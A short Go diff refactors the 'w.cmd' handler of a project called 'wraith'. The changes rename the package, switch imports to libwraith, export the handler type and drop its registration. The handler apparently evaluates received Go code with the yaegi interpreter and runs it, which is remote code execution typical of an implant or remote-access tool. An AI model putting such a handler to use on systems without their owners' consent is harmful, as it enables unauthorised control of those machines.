@@ -1,21 +1,22 @@
-package parts
+package mod_part
 
 import (
 	"fmt"
 
-	mm "git.0x1a8510f2.space/0x1a8510f2/wraith/modmgr"
-	"git.0x1a8510f2.space/0x1a8510f2/wraith/types"
+	"git.0x1a8510f2.space/0x1a8510f2/wraith/libwraith"
 
 	"github.com/traefik/yaegi/interp"
 	"github.com/traefik/yaegi/stdlib"
 )
 
-type cmdHandler struct{}
+type CmdHandler struct {
+	Wraith *libwraith.Wraith
+}
 
-func (h cmdHandler) WraithModule()
-func (h cmdHandler) ProtoPartModule()
+func (h CmdHandler) WraithModule(wraith *libwraith.Wraith) {}
+func (h CmdHandler) ProtoPartModule()                      {}
 
-func (h *cmdHandler) ProcessProtoPart(hkvs *types.HandlerKeyValueStore, data interface{}) {
+func (h *CmdHandler) ProcessProtoPart(hkvs *libwraith.HandlerKeyValueStore, data interface{}) {
 	// Store results of command
 	var result string
 
@@ -49,9 +50,4 @@ func (h *cmdHandler) ProcessProtoPart(hkvs *types.HandlerKeyValueStore, data int
 		panic("wcmd is not a `func() string`")
 	}
 	result = fn()
-}
-
-func init() {
-	// Register handler for w.cmd
-	mm.Modules.Register("w.cmd", mm.ModProtoPart, cmdHandler{}, true)
 }
